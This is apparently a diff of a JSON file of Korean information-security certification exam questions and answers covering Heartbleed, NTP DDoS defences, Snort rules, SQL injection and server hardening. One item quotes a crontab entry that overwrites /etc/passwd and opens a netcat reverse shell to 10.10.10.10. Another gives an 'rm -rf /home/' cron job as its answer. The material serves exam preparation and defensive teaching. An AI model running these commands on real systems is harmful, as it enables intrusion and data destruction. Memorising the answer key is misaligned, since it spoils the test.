+      "answer": "(1) 유출 등이 된 개인정보의 항목\n(2) 유출 등이 된 시점과 그 경위\n(3) 유출 등으로 인하여 발생할 수 있는 피해를 최소화하기 위하여 정보주체가 할 수 있는 방법 등에 관한 정보\n(4) 개인정보처리자의 대응조치 및 피해 구제절차\n(5) 정보주체에게 피해가 발생한 경우 신고 등을 접수할 수 있는 담당부서 및 연락\n\n\n\n\n\n1-12 회 https://information-security.tistory.com/",
       "explanation": "",
       "session": "[문제+답] 1회~28회 정보보안기사 실기 실무형",
       "id": 409
@@ -283,7 +283,7 @@
       "original_id": 114,
       "type": "practical",
       "question": "crontab 스케줄러 내용 분석하라.\n0 * * * * /bin/cp /tmp/passwd1 /etc/passwd 0 0 12 * * root /usr/bin/nc 10.10.10.10 80 -e /bin/bash",
-      "answer": "- 임의로 조작된 passwd1 파일이 원래 passwd 파일을 덮어쓴다. \r - 10.10.10.10 호스트에 80 포트로 연결한다. 리버스쉘의 위험이 있다.",
+      "answer": "- 임의로 조작된 passwd1 파일이 원래 passwd 파일을 덮어쓴다.\n- 10.10.10.10 호스트에 80 포트로 연결한다. 리버스쉘의 위험이 있다.",
       "explanation": "",
       "session": "[문제+답] 1회~28회 정보보안기사 실기 실무형",
       "id": 410
@@ -292,7 +292,7 @@
       "original_id": 119,
       "type": "practical",
       "question": "다음 보기를 보고 주어진 질문에 알맞은 내용을 서술하시오.\n[보기]\n통신 구간 암호화를 위해 많이 사용하는 OpenSSL 라이브러리에서 서버에 저장된 중요 메모리 데이터가 노출되는 (A) 보고서 명명된 심각한 버그가 발견되어 시스템 및 소프트웨어에 대한 신속한 취약점 조치를 권고한다.\n(1) 취약점명은 무엇인가?\n(2) 영향을 받는 버전은 무엇인가?\n(3) 대응방법은 무엇인가?",
-      "answer": "(1) OpenSSL Heartbleed 취약점 \r (2) OpenSSL 1.0.1 ~ OpenSSL 1.0.1f, OpenSSL 1.0.2.beta ~ OpenSSL 1.0.2-beta1 \r (3) 최신버전 UPDATE \r  \r  \r \r \r 1-12 회 https://information-security.tistory.com/",
+      "answer": "(1) OpenSSL Heartbleed 취약점\n(2) OpenSSL 1.0.1 ~ OpenSSL 1.0.1f, OpenSSL 1.0.2.beta ~ OpenSSL 1.0.2-beta1\n(3) 최신버전 UPDATE\n\n\n\n\n1-12 회 https://information-security.tistory.com/",
       "explanation": "",
       "session": "[문제+답] 1회~28회 정보보안기사 실기 실무형",
       "id": 415
@@ -301,7 +301,7 @@
       "original_id": 120,
       "type": "practical",
       "question": "다음은 Crontab 에 대한 설명이다. 주어진 질문에 알맞은 답을 서술하시오.\n[보기]\nCrontab 은 리눅스에서 스케줄링하여 원하는 시간에 작업을 수행할 수 있는 유용한 유틸리티이다. 각 사용자별로 crontab 파일을 가지게 되며 cron job scheduler 가 지정된 시간에 주기적으로 지정된 파일을 실행해 준다.\n(1) Cron 으로 현재 작업되어 있는 내용을 보는 명령어는?\n(2) SIS 계정의 crontab 을 편집하는 방법은 무엇인가?\n(3) 매주 일요일 새벽 3 시에 rm -rf 명령어를 이용하여 /home 디렉터리 하위 모든 파일과 디렉터리를 삭제하는 작업을 등록하라.",
-      "answer": "(1) crontab -l \r (2) crontab -u sis -e \r (3) 0 3 * * 0 rm -rf /home/ 1> /dev/null 2> &1*",
+      "answer": "(1) crontab -l\n(2) crontab -u sis -e\n(3) 0 3 * * 0 rm -rf /home/ 1> /dev/null 2> &1*",
       "explanation": "",
       "session": "[문제+답] 1회~28회 정보보안기사 실기 실무형",
       "id": 416
@@ -310,7 +310,7 @@
       "original_id": 125,
       "type": "practical",
       "question": "아래 이미지를 보고 법률 위반사항과 개선방안 2 가지를 쓰시오.",
-      "answer": "1-1) 위반사항: 개인의 질병(건강)과 같은 민감정보의 수집 \r 1-2) 개선방안: 개인의 민감정보는 원칙적으로 수집을 금지하고 있으며 이를 처리하기 \r 위해서는 다른 개인정보와는 처리와 분리하여 정보주체의 별도 동의를 구한다. \r  \r  \r 2-1) 위반사항: 법정 대리인의 동의 없이 만 14 세 미만의 아동의 개인정보 수집 \r 2-2) 개선방안: 만 14 세 미만 아동의 개인정보 수집 시에는 법정대리인의 동의를 구한다. \r  \r  \r \r \r 1-12 회 https://information-security.tistory.com/",
+      "answer": "1-1) 위반사항: 개인의 질병(건강)과 같은 민감정보의 수집 1-2) 개선방안: 개인의 민감정보는 원칙적으로 수집을 금지하고 있으며 이를 처리하기 위해서는 다른 개인정보와는 처리와 분리하여 정보주체의 별도 동의를 구한다.\n\n\n2-1) 위반사항: 법정 대리인의 동의 없이 만 14 세 미만의 아동의 개인정보 수집 2-2) 개선방안: 만 14 세 미만 아동의 개인정보 수집 시에는 법정대리인의 동의를 구한다.\n\n\n\n\n1-12 회 https://information-security.tistory.com/",
       "explanation": "",
       "session": "[문제+답] 1회~28회 정보보안기사 실기 실무형",
       "id": 421
@@ -328,7 +328,7 @@
       "original_id": 131,
       "type": "practical",
       "question": "아래 그림의 포트스캔의 과정을 보고 물음에 답하시오.\n가) A -------- (TCP 25) SYN --------> B A <-------- (TCP 25) SYN/ACK -------- B A -------- (TCP 25) RST --------> B\n\n나) A -------- (TCP 443) SYN --------> B A <-------- (TCP 443) RST -------- B\n\n다) A -------- (TCP 110) SYN --------> B\n(1) 어떠한 포트 스캔 방식인가?\n(2) 스캔하는 각 포트에 대한 서비스 명을 쓰시오.\n(3) 각 포트 스캔의 결과를 적고 그 근거를 적으시오.",
-      "answer": "(1) TCP Half Open Scan \r  \r (2) SMTP, HTTPS, POP3 \r  \r (3) \r 가) 요청을 받은 B 가 SYN/ACK 을 보내왔으므로 해당 포트는 열려 있고 접근 가능한 \r 상태임. A 가 B 에게 RST 를 보내 내 연결을 끊었으므로 이는 스캔 흔적을 숨기기 위한 \r Stealth 포트 스캔 기법인 TCP Half-open 포트 스캔 방식임. \r  \r 나) 요청을 받은 B 가 RST 를 보내왔으므로 해당 포트는 닫혀 있는 상태 \r  \r 다) 요청을 받은 B 가 응답이 없으므로 이는 포트는 사용 중이거나 방화벽으로 막혀 있는 \r 상태임 \r  \r  \r \r \r 1-12 회 https://information-security.tistory.com/",
+      "answer": "(1) TCP Half Open Scan\n\n(2) SMTP, HTTPS, POP3\n\n(3) 가) 요청을 받은 B 가 SYN/ACK 을 보내왔으므로 해당 포트는 열려 있고 접근 가능한 상태임. A 가 B 에게 RST 를 보내 내 연결을 끊었으므로 이는 스캔 흔적을 숨기기 위한 Stealth 포트 스캔 기법인 TCP Half-open 포트 스캔 방식임.\n\n나) 요청을 받은 B 가 RST 를 보내왔으므로 해당 포트는 닫혀 있는 상태\n\n다) 요청을 받은 B 가 응답이 없으므로 이는 포트는 사용 중이거나 방화벽으로 막혀 있는 상태임\n\n\n\n\n1-12 회 https://information-security.tistory.com/",
       "explanation": "",
       "session": "[문제+답] 1회~28회 정보보안기사 실기 실무형",
       "id": 427
@@ -337,7 +337,7 @@
       "original_id": 132,
       "type": "practical",
       "question": "여행사 업체의 개인정보 이용 약관 동의에 대한 동의서 내용을 보고 정보보안 법규에 어긋나는 부분 세 가지를 찾아서 기술하시오.\n[보기]\n- 수집·이용 목적: 여행자 멤버십 등록 및 이벤트 업체 정보 제공\n- 보유·이용기간: 멤버십 등록일로부터 탈퇴 시까지\n- 수집항목: 성명, 생년월일, 주민등록번호, 주소, 이메일, 전화번호 ※ 정보의 수집·이용에 관한 동의는 거부하실 수 있습니다. 개인정보 수집·이용에 동의하십니까? 동의함, 동의하지 않음",
-      "answer": "- 이벤트 업체에 제공한다는 것에 대해 제3 자 제공에 관한 동의를 별도로 받아야 하며, \r 제공하는 항목, 제공 기간 등에 대해 안내해야 함 \r - 멤버십 등록을 위해 주민등록번호를 수집하는 것은 과도하며, 수집근거가 드러나 있지 \r 않음. 정당한 근거에 의해 수집하더라도 별도로 동의 받아야 함 \r - 동의에 거부할 수 있다는 내용과 안내 시 동의 거부에 대한 불이익도 같이 안내해야 함",
+      "answer": "- 이벤트 업체에 제공한다는 것에 대해 제3 자 제공에 관한 동의를 별도로 받아야 하며, 제공하는 항목, 제공 기간 등에 대해 안내해야 함\n- 멤버십 등록을 위해 주민등록번호를 수집하는 것은 과도하며, 수집근거가 드러나 있지 않음. 정당한 근거에 의해 수집하더라도 별도로 동의 받아야 함\n- 동의에 거부할 수 있다는 내용과 안내 시 동의 거부에 대한 불이익도 같이 안내해야 함",
       "explanation": "",
       "session": "[문제+답] 1회~28회 정보보안기사 실기 실무형",
       "id": 428
@@ -346,7 +346,7 @@
       "original_id": 137,
       "type": "practical",
       "question": "최근 알려진 NTP 취약점을 이용한 분산 서비스 거부 공격은 공격 대상 IP로 출발지 IP 를 변경한 monlist 요청을 다수의 NTP 서버로 전달하여 대량의 monlist 응답 패킷이 공격 대상으로 향하도록 하는 공격이다. 다음과 같은 보안 권고안에 대하여 그 의미를 설명하시오.\n[보기]\n[NTP 취약점 대응방안]\n1) ntp -version\n2) disable monlist\n3) ntpdc -c monlist \"점검 대상 NTP 서버 IP\"\n4) iptables -A OUT -p udp --sport 123 -m length --length 100 -j DROP",
-      "answer": "(1) NTP 데몬의 버전을 확인하여 monlist 기능이 해제된 최신 버전으로 업그레이드한다. \r (2) NTP 데몬의 monlist 기능을 해제한다. \r (3) 점검 대상 NTP 서버가 monlist 명령을 허용하는 지 여부를 점검한다. \r (4) NTP 서버의 iptables 를 이용하여 100byte 이상의 NTP 응답을 차단한다. \r  \r  \r \r \r 1-12 회 https://information-security.tistory.com/",
+      "answer": "(1) NTP 데몬의 버전을 확인하여 monlist 기능이 해제된 최신 버전으로 업그레이드한다.\n(2) NTP 데몬의 monlist 기능을 해제한다.\n(3) 점검 대상 NTP 서버가 monlist 명령을 허용하는 지 여부를 점검한다.\n(4) NTP 서버의 iptables 를 이용하여 100byte 이상의 NTP 응답을 차단한다.\n\n\n\n\n1-12 회 https://information-security.tistory.com/",
       "explanation": "",
       "session": "[문제+답] 1회~28회 정보보안기사 실기 실무형",
       "id": 433
@@ -354,8 +354,8 @@
     {
       "original_id": 138,
       "type": "practical",
-      "question": "다음은 HTTP GET Flooding 공격에 대한 스노트 탐지이다. 다음 각각의 질문에 답하시오.\n[보기]\n[보기]\nalert tcp any any -> any 80 (msg:\"HTTP Get Flooding Detect\"; content:\"GET / HTTP/1.1\";\nnocase; threshold:type threshold, track by_src, count 10, seconds 1; sid:10000999)\n(1) 스노트 룰이 매치된 이후 패킷이 탐지되었을 때의 처리방식을 의미한다. 탐지된 패킷을 차단하고 로그를 남기는 action 유형 2 가지를 쓰시오.\n\n(2) 스노트 룰의 content 옵션은 패킷의 페이로드에서 검사할 문자열을 지정하기 위한 옵션이다. [보기]의 룰에서 content 옵션으로 지정한 문자열은 페이로드의 첫 번째 바이트로부터 13 번째 바이트 범위 내에서 검사하고자 할 때 다음과 같이 들어갈 옵션을 문법에 맞게 정확히 기술하시오.\n\n(3) 스노트의 threshold 옵션은 이벤트 발생을 제어하는 옵션이다. 같은 룰에서 발생하는 이벤트 수를 제어하여 과도하게 많은 이벤트가 발생하는 것을 방지하기 위한 옵션이다.\n[보기]의 룰에서 alert 이벤트 발생 수를 제한하는 기준과 방식을 정확히 기술하시오.",
-      "answer": "(1) drop, reject \r (2) depth:13 \r (3) 출발지를 기준으로 매 1 초 동안 10 번째 이벤트마다 alert action 을 수행 \r  \r  \r  \r  \r  \r \r \r 1-12 회 https://information-security.tistory.com/",
+      "question": "다음은 HTTP GET Flooding 공격에 대한 스노트 탐지이다. 다음 각각의 질문에 답하시오.\n[보기]\n[보기]\nalert tcp any any -> any 80 (msg:\"HTTP Get Flooding Detect\"; content:\"GET / HTTP/1.1\";\nnocase; threshold:type threshold, track by_src, count 10, seconds 1; sid:10000999)\n(1) 스노트 룰이 매치된 이후 패킷이 탐지되었을 때의 처리방식을 의미한다. 탐지된 패킷을 차단하고 로그를 남기는 action 유형 2 가지를 쓰시오.\n\n(2) 스노트 룰의 content 옵션은 패킷의 페이로드에서 검사할 문자열을 지정하기 위한 옵션이다. [보기]의 룰에서 content 옵션으로 지정한 문자열은 페이로드의 첫 번째\n바이트로부터 13 번째 바이트 범위 내에서 검사하고자 할 때 다음과 같이 들어갈 옵션을 문법에 맞게 정확히 기술하시오.\n\n(3) 스노트의 threshold 옵션은 이벤트 발생을 제어하는 옵션이다. 같은 룰에서 발생하는 이벤트 수를 제어하여 과도하게 많은 이벤트가 발생하는 것을 방지하기 위한 옵션이다.\n[보기]의 룰에서 alert 이벤트 발생 수를 제한하는 기준과 방식을 정확히 기술하시오.",
+      "answer": "(1) drop, reject\n(2) depth:13\n(3) 출발지를 기준으로 매 1 초 동안 10 번째 이벤트마다 alert action 을 수행\n\n\n\n\n\n\n\n1-12 회 https://information-security.tistory.com/",
       "explanation": "",
       "session": "[문제+답] 1회~28회 정보보안기사 실기 실무형",
       "id": 434
@@ -364,7 +364,7 @@
       "original_id": 143,
       "type": "practical",
       "question": "HeartBleed 취약점 탐지위한 Snort Rule 설정 의미를 설명하시오.\n[보기]\nalert tcp any any < > any (1)[443,465,523] ((2)content:\"|18 03 00|\"; depth: 3;\n(3)content:\"|01|\"; distance: 2; within: 1;\n(4) content:!\"|00|\"; within: 1; (5)msg: \"SSLv3 Malicious Heartbleed Request V2”;\n(6) sid: 1;)",
-      "answer": "(1) 탐지 대상 포트 번호를 443, 465, 523 으로 지정 \r  \r (2) Content 에서 첫 3 바이트를 검사하여 바이너리 값으로 \"18 03 00\" \r 이 있는지 검사 \r  \r (3) (2)번이 끝난 위치에서 2 바이트 떨어진 위치에서 1 바이트를 검사하여 바이너리 \r 값으로 \"01\"이 있는지 검사 \r  \r (4) (3)번이 끝난 위치에서 바로 1 바이트를 검사하여 바이너리 값으로 \"00\"이 포함되지 \r 않은 지 여부를 검사 \r  \r (5) (1)~(4)의 탐지 룰에 모두 매칭이 되는 경우 로그에 \"SSLv3 Malicious Heartbleed \r Request V2\"로 기록 \r  \r (6) 해당 룰의 식별자를 1 로 지정 \r  \r  \r  \r \r \r 1-12 회 https://information-security.tistory.com/",
+      "answer": "(1) 탐지 대상 포트 번호를 443, 465, 523 으로 지정\n\n(2) Content 에서 첫 3 바이트를 검사하여 바이너리 값으로 \"18 03 00\" 이 있는지 검사\n\n(3) (2)번이 끝난 위치에서 2 바이트 떨어진 위치에서 1 바이트를 검사하여 바이너리 값으로 \"01\"이 있는지 검사\n\n(4) (3)번이 끝난 위치에서 바로 1 바이트를 검사하여 바이너리 값으로 \"00\"이 포함되지 않은 지 여부를 검사\n\n(5) (1)~(4)의 탐지 룰에 모두 매칭이 되는 경우 로그에 \"SSLv3 Malicious Heartbleed Request V2\"로 기록\n\n(6) 해당 룰의 식별자를 1 로 지정\n\n\n\n\n\n1-12 회 https://information-security.tistory.com/",
       "explanation": "",
       "session": "[문제+답] 1회~28회 정보보안기사 실기 실무형",
       "id": 439
@@ -373,7 +373,7 @@
       "original_id": 144,
       "type": "practical",
       "question": "Robot.txt 파일에 대하여 다음 물음에 답하시오.\n(1) Robot.txt 파일의 용도\n(2) 아래 설정값의 의미 useragent : yeti useragent : googlebot (가) allow : /\n\nuseragent : googlebot-image (나) disallow : /admin/ (다) disallow : /*.pdf$",
-      "answer": "(1) 검색엔진에서 자동 크롤링 도구에 대하여 접근 허용 여부를 제어하기 위한 파일 \r  \r (2-가) 검색 엔진 로봇(yeti, googlebot)에 대하여 root 디렉토리(/) 밑의 모든 파일 및 \r 디렉토리의 크롤링을 허용 \r (2-나) 검색 엔진 로봇(googlebot-image)에 대하여 /admin 폴더 크롤링을 허용하지 \r 않음. \r (2-다) 검색 엔진 로봇(googlebot-image)에 대하여 pdf 확장자를 가진 파일에 대하여 \r 크롤링을 허용하지 않음",
+      "answer": "(1) 검색엔진에서 자동 크롤링 도구에 대하여 접근 허용 여부를 제어하기 위한 파일\n\n(2-가) 검색 엔진 로봇(yeti, googlebot)에 대하여 root 디렉토리(/) 밑의 모든 파일 및 디렉토리의 크롤링을 허용 (2-나) 검색 엔진 로봇(googlebot-image)에 대하여 /admin 폴더 크롤링을 허용하지 않음.\n(2-다) 검색 엔진 로봇(googlebot-image)에 대하여 pdf 확장자를 가진 파일에 대하여 크롤링을 허용하지 않음",
       "explanation": "",
       "session": "[문제+답] 1회~28회 정보보안기사 실기 실무형",
       "id": 440
@@ -382,7 +382,7 @@
       "original_id": 149,
       "type": "practical",
       "question": "NTP 서비스 취약점을 이용한 한 DDoS 공격 대응방안 4 가지를 서술하시오.",
-      "answer": "1) 서버측면 대응 방안 2 가지 \r 1-1) NTP 서버 버전 업그레이드 : monlist 기능이 제거된 버전(4.2.8 이상) 으로 \r 업그레이드 하기 \r 1-2) NTP 서버 버전 업그레이드 불가시 monlist 기능 비활성화 : /etc/ntp.conf 파일에 \r \"disable monitor\" 설정 \r  \r 2) 네트워크 측면 대응 방안 2 가지 \r 2-1) 보안장비(예:방화벽)에서 인가되지 않은 외부 트래픽 유입 차단 : NTP 서비스 \r 포트(udp 123) 접근 제한 \r 2-2) 보안장비(예:방화벽)에서 비정상 NTP 패킷 차단 : 100 바이트 이상 NTP 응답 패킷 \r 차단(정상 패킷은 40 바이트 이하). 동일 IP 에서 자주 쿼리 요청시 차단. \r  \r  \r \r \r 1-12 회 https://information-security.tistory.com/",
+      "answer": "1) 서버측면 대응 방안 2 가지 1-1) NTP 서버 버전 업그레이드 : monlist 기능이 제거된 버전(4.2.8 이상) 으로 업그레이드 하기 1-2) NTP 서버 버전 업그레이드 불가시 monlist 기능 비활성화 : /etc/ntp.conf 파일에 \"disable monitor\" 설정\n\n2) 네트워크 측면 대응 방안 2 가지 2-1) 보안장비(예:방화벽)에서 인가되지 않은 외부 트래픽 유입 차단 : NTP 서비스 포트(udp 123) 접근 제한 2-2) 보안장비(예:방화벽)에서 비정상 NTP 패킷 차단 : 100 바이트 이상 NTP 응답 패킷 차단(정상 패킷은 40 바이트 이하). 동일 IP 에서 자주 쿼리 요청시 차단.\n\n\n\n\n1-12 회 https://information-security.tistory.com/",
       "explanation": "",
       "session": "[문제+답] 1회~28회 정보보안기사 실기 실무형",
       "id": 445
@@ -390,8 +390,8 @@
     {
       "original_id": 150,
       "type": "practical",
-      "question": "다음 자바 프로그램은 SQL Injection 에 취약한 소스와 취약점을 해소한 소스코드이다. ( )에 들어갈 코드를 작성하시오.\n[보기]\n[취약한 소스코드] 1: //외부로부터 입력받은 값을 검증 없이 사용할 경우 안전하지 않다.\n2: String gubun = request.getParameter(\"gubun\");\n3: ......\n4: String sql = \"SELECT * FROM board WHERE b_gubun = '\" + gubun + \"'\";\n5: Connection con = db.getConnection();\n6: Statement stmt = con.createStatement();\n7: //외부로부터 입력받은 값이 검증 또는 처리 없이 쿼리로 수행되어 안전하지 않다.\n8: ResultSet rs = stmt.executeQuery(sql);\n\n[취약점을 해소한 소스코드] 1: String gubun = request.getParameter(\"gubun\");\n2: ......\n3: //1. 사용자에 의해 외부로부터 입력받은 값은 안전하지 않을 수 있으므로, PreparedStatement 사용을 위해 ?문자로 바인딩 변수를 사용한다.\n4: String sql = \"SELECT * FROM board WHERE b_gubun = ( A ) \";\n5: Connection con = db.getConnection();\n6: //2. PreparedStatement 사용한다.\n7: PreparedStatement pstmt = con.( B )(sql);\n8: //3.PreparedStatement 객체를 상수 스트링으로 생성하고, 파라미터 부분을 setString 등의 메소드로 설정하여 안전하다.\n9: pstmt.( C )(1, gubun);\n10: ResultSet rs = pstmt.( D );",
-      "answer": "A) ? \r B) prepareStatement \r C) setString \r D) executeQuery() \r  \r  \r  \r  \r  \r \r \r 1-12 회 https://information-security.tistory.com/",
+      "question": "다음 자바 프로그램은 SQL Injection 에 취약한 소스와 취약점을 해소한 소스코드이다. ( )에 들어갈 코드를 작성하시오.\n[보기]\n[취약한 소스코드]\n1: //외부로부터 입력받은 값을 검증 없이 사용할 경우 안전하지 않다.\n2: String gubun = request.getParameter(\"gubun\");\n3: ......\n4: String sql = \"SELECT * FROM board WHERE b_gubun = '\" + gubun + \"'\";\n5: Connection con = db.getConnection();\n6: Statement stmt = con.createStatement();\n7: //외부로부터 입력받은 값이 검증 또는 처리 없이 쿼리로 수행되어 안전하지 않다.\n8: ResultSet rs = stmt.executeQuery(sql);\n\n[취약점을 해소한 소스코드]\n1: String gubun = request.getParameter(\"gubun\");\n2: ......\n3: //1. 사용자에 의해 외부로부터 입력받은 값은 안전하지 않을 수 있으므로, PreparedStatement 사용을 위해 ?문자로 바인딩 변수를 사용한다.\n4: String sql = \"SELECT * FROM board WHERE b_gubun = ( A ) \";\n5: Connection con = db.getConnection();\n6: //2. PreparedStatement 사용한다.\n7: PreparedStatement pstmt = con.( B )(sql);\n8: //3.PreparedStatement 객체를 상수 스트링으로 생성하고, 파라미터 부분을 setString 등의 메소드로 설정하여 안전하다.\n9: pstmt.( C )(1, gubun);\n10: ResultSet rs = pstmt.( D );",
+      "answer": "A) ?\nB) prepareStatement C) setString D) executeQuery()\n\n\n\n\n\n\n\n1-12 회 https://information-security.tistory.com/",
       "explanation": "",
       "session": "[문제+답] 1회~28회 정보보안기사 실기 실무형",
       "id": 446
@@ -400,7 +400,7 @@
       "original_id": 155,
       "type": "practical",
       "question": "DB 에 대한 감사 로그 설정과 관련된 문제이다. 아래 결과를 보고 각 질문에 답하시오.\n[보기]\n#sqlplus / as sysdba SQL> show parameter audit NAME                        TYPE      VALUE\n---------------------------- ----------   ------------------------------------------- audit_file_dest            string      /u01/app/oracle/admin/ORCL/adump audit_sys_operations boolean  FALSE audit_syslog_level      string      LOCAL0.INFO audit_trail                    string      NONE\n\n1) 상기 감사 로그 설정이 어떤 의미인지 설명하시오.\n2) 감사 로그를 SYS.AUD$ 테이블에 저장되게 하려면, 감사 로그 설정값을 어떻게 수정해야 하는지 설명하시오.\n3) 감사 로그는 데이터베이스 내부보다 외부에 남기는 것이 좋은데, 그 이유를 보안 측면에서 설명하시오.",
-      "answer": "1)  \r - \r audit_file_dest \r : \r audit \r 로그를 \r OS\r 에 \r 남기도록 \r 설정한 \r 경우 \r /u01/app/oracle/admin/ORCL/adump 파일에 저장 \r - audit_sys_operations : SYS 계정에 대한 감사는 수행하지 않음 \r - audit_syslog_leve : syslog 로 감사로그를 전송 시 syslog 등급을 LOCAL0.INFO 로 \r 설정(단, audit_trail 값이 OS 로 설정되어야 하고, syslog config 에 \"LOCAL0.INFO \r @@10.20.2.11:514\" 와 같이 SIEM 로그 수집 서버 정보를 설정해 두어야 함) \r - audit_trail : NONE 으로 설정했으므로, 감사 로그가 남지 않음.  \r  \r 2) audit_trail 을 값을 DB 로 변경. \r  \r 3) 공격자가 DB 를 장악하게 되면, 로그 위변조를 통해 악의적인 행위의 흔적을 지울 수 \r 있음. 로그가 외부에 남는 경우 사고 발생 시 신뢰 가능한 증거 확보가 가능하고 SIEM \r 과 같은 통합 모니터링 툴과 연계하여 중앙에서 통합 관리하는 경우 공격 행위에 대한 \r 실시간 모니터링을 통해 선제적이고 능동적인 대응이 가능해짐.  \r  \r  \r  \r  \r  \r \r \r 1-12 회 https://information-security.tistory.com/",
+      "answer": "1)\n- audit_file_dest :\naudit 로그를 OS 에 남기도록 설정한 경우 /u01/app/oracle/admin/ORCL/adump 파일에 저장\n- audit_sys_operations : SYS 계정에 대한 감사는 수행하지 않음\n- audit_syslog_leve : syslog 로 감사로그를 전송 시 syslog 등급을 LOCAL0.INFO 로 설정(단, audit_trail 값이 OS 로 설정되어야 하고, syslog config 에 \"LOCAL0.INFO @@10.20.2.11:514\" 와 같이 SIEM 로그 수집 서버 정보를 설정해 두어야 함)\n- audit_trail : NONE 으로 설정했으므로, 감사 로그가 남지 않음.\n\n2) audit_trail 을 값을 DB 로 변경.\n\n3) 공격자가 DB 를 장악하게 되면, 로그 위변조를 통해 악의적인 행위의 흔적을 지울 수 있음. 로그가 외부에 남는 경우 사고 발생 시 신뢰 가능한 증거 확보가 가능하고 SIEM 과 같은 통합 모니터링 툴과 연계하여 중앙에서 통합 관리하는 경우 공격 행위에 대한 실시간 모니터링을 통해 선제적이고 능동적인 대응이 가능해짐.\n\n\n\n\n\n\n\n1-12 회 https://information-security.tistory.com/",
       "explanation": "",
       "session": "[문제+답] 1회~28회 정보보안기사 실기 실무형",
       "id": 451
@@ -409,7 +409,7 @@
       "original_id": 156,
       "type": "practical",
       "question": "리눅스 OS 의 취약점과 관련된 문제이다. 아래 화면에 출력된 정보를 기반으로 각 질문에 답하시오.\n[보기]\n(A)\n$telnet 192.168.10.20 Trying 192.168.10.20...\nConnected to 192.168.10.20.\nEscape character is '^]'.\nUbuntu 20.04.6 LTS Linux server01 5.15.0-92-generic x86_64 server01 login: root Password:\nWelcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-02-generic x86_64) Last login: Mon Jan 6 09:41:12 KST 2026 from 192.168.10.15 root@server01:~#\n\n(B)\n$ftp 192.168.10.30 Connected to 192.168.10.30.\n220 Welcome to vsFTPd 3.0.3 Name (192.168.10.30:root): root Password:\n230 Login successful.\nRemote system type is UNIX.\nUsing binary mode to transfer files.\nftp>\n\n1) A 와 B 에서 확인된 취약점은 무엇인가?\n2) A 취약점에 대한 대응 방안을 설명하시오.\n3) B 취약점에 대한 대응 방안을 설명하시오.\n\n\n\n\n\n1-12 회 https://information-security.tistory.com/",
-      "answer": "1-1) A 의 경우 OS 와 커널 정보가 출력되므로 취약점(CVE) 정보와 매핑하여 취약점을 \r 악용한 익스플로잇이 가능하고, root 계정 직접 로그인이 허용되어 있어 최고 권한 탈취 \r 위험이 있음. 무엇보다 보안에 취약한 Telnet 서비스가 사용되고 있는 것도 위험함.   \r  \r 1-2) B 의 경우 ftp 데몬명과 버전 정보가 출력되므로 취약점(CVE) 정보와 매핑하여 \r 취약점을 악용한 익스플로잇이 가능하고, root 계정 직접 로그인이 허용되어 있어 최고 \r 권한 탈취를 통해 중요 정보 유출 가능 위험이 있음. 무엇보다 보안에 취약한 ftp \r 서비스가 사용되고 있는 것도 위험함.  \r  \r  \r 2) 가급적 telent 보다는 안전한 프로토콜인 SSH 를 사용하도록 하고, 부득이하게 telnet \r 을 사용해야 하는 경우 root 계정을 통한 직접 로그인은 차단해야 함. (설정 예: \r /etc/securetty 파일내에 pts/* 값은 삭제). 또한 배너 정보(OS 버전, 커널 정보) 가 \r 노출되지 않도록 설정해야 함.(설정 예: /etc/issue.net 파일을 수정하여 접속 시 보여줄 \r 배너 문구를 아래와 같이 입력)  \r  \r **************************************************************** \r  \r *   WARNING: Unauthorized access is prohibited.      * \r  \r *   This system is monitored for security purposes.   * \r  \r **************************************************************** \r  \r  3) 가급적 ftp 보다는 안전한 프로토콜인 sftp 를 사용하도록 하고, 부득이하게 ftp 를 \r 사용해야 하는 경우 root 계정을 통한 직접 로그인은 차단해야 함. (설정 예: /etc/ftpusers \r 파일 내에 root 계정 추가 or /etc/vsftpd/user_list\r 에 root 계정을 등록하고 \r /etc/vsftpd.conf 에서 userlist_enable=YES, userlist_deny=YES 로 설정). 또한 배너 \r 정보(ftp 서비스 종류, 버전 정보) 가 노출되지 않도록 설정해야 함.(설정 예: \r /etc/vsftpd.conf 에서 ftpd_banner=Unauthorized access is prohibited. 와 같이 경고 \r 문구만 \r 출력하도록 \r 수정. \r 또는 \r banner_file=/etc/ftp_banner.txt \r 로 \r 지정하고, \r ftp_banner.txt 에 상세 경고 문구를 등록)",
+      "answer": "1-1) A 의 경우 OS 와 커널 정보가 출력되므로 취약점(CVE) 정보와 매핑하여 취약점을 악용한 익스플로잇이 가능하고, root 계정 직접 로그인이 허용되어 있어 최고 권한 탈취 위험이 있음. 무엇보다 보안에 취약한 Telnet 서비스가 사용되고 있는 것도 위험함.\n\n1-2) B 의 경우 ftp 데몬명과 버전 정보가 출력되므로 취약점(CVE) 정보와 매핑하여 취약점을 악용한 익스플로잇이 가능하고, root 계정 직접 로그인이 허용되어 있어 최고 권한 탈취를 통해 중요 정보 유출 가능 위험이 있음. 무엇보다 보안에 취약한 ftp 서비스가 사용되고 있는 것도 위험함.\n\n\n2) 가급적 telent 보다는 안전한 프로토콜인 SSH 를 사용하도록 하고, 부득이하게 telnet 을 사용해야 하는 경우 root 계정을 통한 직접 로그인은 차단해야 함. (설정 예:\n/etc/securetty 파일내에 pts/* 값은 삭제). 또한 배너 정보(OS 버전, 커널 정보) 가 노출되지 않도록 설정해야 함.(설정 예: /etc/issue.net 파일을 수정하여 접속 시 보여줄 배너 문구를 아래와 같이 입력)\n\n****************************************************************\n\n*   WARNING: Unauthorized access is prohibited.      *\n\n*   This system is monitored for security purposes.   *\n\n****************************************************************\n\n3) 가급적 ftp 보다는 안전한 프로토콜인 sftp 를 사용하도록 하고, 부득이하게 ftp 를 사용해야 하는 경우 root 계정을 통한 직접 로그인은 차단해야 함. (설정 예: /etc/ftpusers 파일 내에 root 계정 추가 or /etc/vsftpd/user_list 에 root 계정을 등록하고 /etc/vsftpd.conf 에서 userlist_enable=YES, userlist_deny=YES 로 설정). 또한 배너 정보(ftp 서비스 종류, 버전 정보) 가 노출되지 않도록 설정해야 함.(설정 예:\n/etc/vsftpd.conf 에서 ftpd_banner=Unauthorized access is prohibited. 와 같이 경고 문구만 출력하도록 수정.\n또는 banner_file=/etc/ftp_banner.txt 로 지정하고, ftp_banner.txt 에 상세 경고 문구를 등록)",
       "explanation": "",
       "session": "[문제+답] 1회~28회 정보보안기사 실기 실무형",
       "id": 452
